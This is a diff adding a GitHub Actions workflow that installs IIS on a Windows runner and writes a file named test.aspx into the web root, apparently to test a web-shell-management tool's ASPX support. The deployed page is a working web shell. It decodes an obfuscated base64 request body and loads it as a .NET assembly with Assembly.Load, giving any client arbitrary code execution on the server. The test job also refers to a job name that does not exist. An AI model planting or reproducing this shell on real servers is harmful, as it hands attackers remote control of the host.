@@ -1,0 +1,106 @@
+name: IIS Setup on Windows Runner
+
+on:
+  pull_request:
+    branches: [ main ]
+    types: [ opened, synchronize, reopened ]
+    paths:
+      - "common/**"
+      - ".github/workflows/wsm-test.yml"
+
+jobs:
+  setup-iis:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Setup IIS
+        run: |
+          # 确保IIS功能已经被启用
+          Dism /online /Enable-Feature /FeatureName:IIS-WebServerRole
+          Dism /online /Enable-Feature /FeatureName:IIS-WebServer
+          Dism /online /Enable-Feature /FeatureName:IIS-CommonHttpFeatures
+          Dism /online /Enable-Feature /FeatureName:IIS-StaticContent
+          Dism /online /Enable-Feature /FeatureName:IIS-DefaultDocument
+          Dism /online /Enable-Feature /FeatureName:IIS-DirectoryBrowsing
+          Dism /online /Enable-Feature /FeatureName:IIS-HttpErrors
+          Dism /online /Enable-Feature /FeatureName:IIS-HttpRedirect
+          Dism /online /Enable-Feature /FeatureName:IIS-ApplicationDevelopment
+          Dism /online /Enable-Feature /FeatureName:IIS-ASPNET45
+          Dism /online /Enable-Feature /FeatureName:IIS-NetFxExtensibility45
+          Dism /online /Enable-Feature /FeatureName:IIS-ISAPIExtensions
+          Dism /online /Enable-Feature /FeatureName:IIS-ISAPIFilter
+          Dism /online /Enable-Feature /FeatureName:IIS-HealthAndDiagnostics
+          Dism /online /Enable-Feature /FeatureName:IIS-HttpLogging
+          Dism /online /Enable-Feature /FeatureName:IIS-LoggingLibraries
+          Dism /online /Enable-Feature /FeatureName:IIS-RequestMonitor
+          Dism /online /Enable-Feature /FeatureName:IIS-HttpTracing
+          Dism /online /Enable-Feature /FeatureName:IIS-Security
+          Dism /online /Enable-Feature /FeatureName:IIS-URLAuthorization
+          Dism /online /Enable-Feature /FeatureName:IIS-RequestFiltering
+          Dism /online /Enable-Feature /FeatureName:IIS-IPSecurity
+          Dism /online /Enable-Feature /FeatureName:IIS-Performance
+          Dism /online /Enable-Feature /FeatureName:IIS-WebServerManagementTools
+          Dism /online /Enable-Feature /FeatureName:IIS-ManagementConsole
+          Dism /online /Enable-Feature /FeatureName:IIS-IIS6ManagementCompatibility
+          Dism /online /Enable-Feature /FeatureName:IIS-Metabase
+
+      - name: Deploy Application
+        run: |
+          $content = @"
+          <%@ Page Language="C#" %>
+          <%@Import Namespace="System.Reflection" %>
+          <script runat="server">
+          private byte[] Decrypt(byte[] data)
+          {
+            // 提取数据的一部分
+            byte[] partOfData = new byte[data.Length - 40];
+            Array.Copy(data, 37, partOfData, 0, data.Length - 40);
+            // 将数据转换为字符串，并替换其中的一些字符串
+            string str = System.Text.Encoding.ASCII.GetString(partOfData);
+            str = str.Replace("go0p", "+").Replace("yakit", "/");
+            // Response.Write(str);
+            // 将结果解码为 base64
+            byte[] resdata = System.Convert.FromBase64String(str);
+            Context.Session["Decrypt"] = resdata;
+            return resdata;
+          }
+          </script>
+          <%
+          byte[] c=Request.BinaryRead(Request.ContentLength);
+          byte[] resdata = Decrypt(c);
+          Assembly.Load(resdata).CreateInstance("UEcho").Equals(Context);
+          %>
+          "@
+          $content | Out-File -FilePath "C:\inetpub\wwwroot\test.aspx" -Encoding ASCII
+
+      - name: Create and start IIS Website on a specific port
+        run: |
+          Import-Module WebAdministration
+          $siteName = "MyWebsite"
+          $port = 8087  # Specify your port here
+          $physicalPath = "C:\inetpub\wwwroot"
+          $appPoolName = "MyAppPool"
+
+          # Check if the application pool already exists
+          if (-not (Get-WebAppPool -Name $appPoolName -ErrorAction SilentlyContinue)) {
+              # Create a new application pool if it does not exist
+              New-WebAppPool -Name $appPoolName
+          }
+
+          # Create a new website
+          New-Website -Name $siteName -Port $port -PhysicalPath $physicalPath -ApplicationPool $appPoolName
+          # Start the website
+          Start-Website -Name $siteName
+
+  test:
+    name: ${{ matrix.name }}
+    needs: setup
+    runs-on: windows-latest
+    strategy:
+      matrix:
+        include:
+          - name: Test ASPX
+            run: |
+              go test -timeout 20s -run TestNewWebASPXShell ./common/wsm
